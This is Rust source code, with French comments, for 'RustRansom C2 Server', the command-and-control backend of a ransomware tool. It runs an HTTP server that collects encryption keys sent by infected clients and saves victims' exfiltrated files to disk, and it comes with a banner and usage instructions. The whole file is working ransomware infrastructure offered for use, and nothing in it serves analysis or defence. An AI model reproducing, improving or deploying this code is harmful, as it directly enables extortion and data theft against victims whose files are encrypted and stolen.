/*!
 * # RustRansom C2 Server
 *
 * Ce serveur C2 gère les clés AES et les fichiers exfiltrés depuis le client RustRansom.
 * Il fournit une API HTTP via la crate **Warp**.
 *
 * ## Usage - Affichage de l'aide
 * ```sh
 * ./target/release/rustransom_server -h
 * ```
 *
 * ## Usage
 * ```sh
 * ./target/release/rustransom_server -i <IP> -p <PORT>
 * ```
 * - `-i <IP>` : Adresse IP d'écoute (défaut : 127.0.0.1).
 * - `-p <PORT>` : Port d'écoute (défaut : 8080).
 *
 * ## Compilation
 * ```sh
 * cargo build --release
 * ```
 */

 use warp::Filter;
 use std::sync::{Arc, Mutex};
 use std::collections::HashMap;
 use std::env;
 use bytes::Bytes;
 use std::fs;
 
 #[derive(Debug)]
 struct ExfiltrationError(#[allow(dead_code)] std::io::Error);
 impl warp::reject::Reject for ExfiltrationError {}
 
 const DEFAULT_IP: &str = "127.0.0.1";
 const DEFAULT_PORT: u16 = 8080;
 
 /// Affiche la bannière et un bref tutoriel d'utilisation
 fn show_banner() {
     println!(r#"
     
,a88888b. d8888b. .d88888b                                               
d8'   `88     `88 88.    "'                                              
88        .aaadP' `Y88888b. .d8888b. 88d888b. dP   .dP .d8888b. 88d888b. 
88        88'           `8b 88ooood8 88'  `88 88   d8' 88ooood8 88'  `88 
Y8.   .88 88.     d8'   .8P 88.  ... 88       88 .88'  88.  ... 88       
 Y88888P' Y88888P  Y88888P  `88888P' dP       8888P'   `88888P' dP  
 
            By @Cholula
 
          RustRansom C2 Server
 Usage:
   ./target/release/rustransom_server -i <IP> -p <PORT>
 Usage - Aide:
   ./target/release/rustransom_server -h
 ⚠️  Les données sont envoyées sans chiffrement.
 "#);
 }
 
 /// Affiche l'aide complète et quitte le programme
 fn show_help() {
     show_banner();
     println!(r#"
 Ce serveur C2 fournit trois endpoints HTTP :
   - GET /status           : Vérifie que le serveur est actif.
   - POST /data            : Reçoit une clé de chiffrement depuis le client RustRansom.
   - POST /files/<nom>     : Reçoit un fichier exfiltré depuis le client RustRansom.
   
 Options CLI :
   - -i <IP>   : Adresse IP sur laquelle écouter (défaut : 127.0.0.1).
   - -p <PORT> : Port d'écoute (défaut : 8080).
 
 Exemple :
   ./target/release/rustransom_server -i 0.0.0.0 -p 443
 "#);
     std::process::exit(0);
 }
 
 #[derive(Default)]
 struct ServerState {
     keys: Mutex<HashMap<String, String>>,
 }
 
 /// Gère l'endpoint d'exfiltration.
 /// Sauvegarde le fichier reçu dans le dossier "exfiltrated_files".
 async fn handle_file_exfiltration(filename: String, data: Bytes) -> Result<impl warp::Reply, warp::Rejection> {
     let folder = "exfiltrated_files";
     if let Err(e) = fs::create_dir_all(folder) {
         return Err(warp::reject::custom(ExfiltrationError(e)));
     }
     let filepath = format!("{}/{}", folder, filename);
     match fs::write(&filepath, data) {
         Ok(_) => {
             println!("[✔] Fichier exfiltré reçu et sauvegardé: {}", filepath);
             Ok(warp::reply::json(&"Fichier reçu"))
         },
         Err(e) => {
             eprintln!("[❌] Erreur lors de la sauvegarde de {}: {}", filepath, e);
             Err(warp::reject::custom(ExfiltrationError(e)))
         }
     }
 }
 
 #[tokio::main]
 async fn main() {
     let args: Vec<String> = env::args().collect();
     if args.iter().any(|arg| arg == "-h") {
         show_help();
     }
     
     show_banner();
     
     let mut ip = DEFAULT_IP.to_string();
     let mut port = DEFAULT_PORT;
     let mut i = 1;
     while i < args.len() {
         match args[i].as_str() {
             "-i" => {
                 if i + 1 < args.len() {
                     ip = args[i + 1].clone();
                     i += 1;
                 } else {
                     eprintln!("[❌] Erreur: IP non spécifiée après -i.");
                     return;
                 }
             },
             "-p" => {
                 if i + 1 < args.len() {
                     port = args[i + 1].parse().unwrap_or(DEFAULT_PORT);
                     i += 1;
                 } else {
                     eprintln!("[❌] Erreur: Port non spécifié après -p.");
                     return;
                 }
             },
             _ => {
                 if args[i] != "-h" {
                     eprintln!("[❌] Erreur: Option inconnue `{}`.", args[i]);
                     return;
                 }
             }
         }
         i += 1;
     }
     
     println!("🚀 RustRansom C2 Server démarré sur {}:{}\n", ip, port);
     
     let state = Arc::new(ServerState::default());
     
     let status = warp::path("status").map(|| warp::reply::json(&"RustRansom C2 Server is running"));
     
     let receive_key = {
         let state = state.clone();
         warp::path("data")
             .and(warp::post())
             .and(warp::body::bytes())
             .map(move |data: Bytes| {
                 let key_data = String::from_utf8_lossy(&data);
                 {
                     let mut keys = state.keys.lock().unwrap();
                     keys.insert("last_key".to_string(), key_data.to_string());
                 }
                 println!("🔑 Clé reçue: {}", key_data);
                 warp::reply::json(&"Clé enregistrée avec succès")
             })
     };
     
     let file_exfiltration = warp::path!("files" / String)
         .and(warp::post())
         .and(warp::body::bytes())
         .and_then(handle_file_exfiltration);
     
     let routes = warp::get().and(status)
         .or(receive_key)
         .or(file_exfiltration);
     
     warp::serve(routes).run(([0, 0, 0, 0], port)).await;
 }
 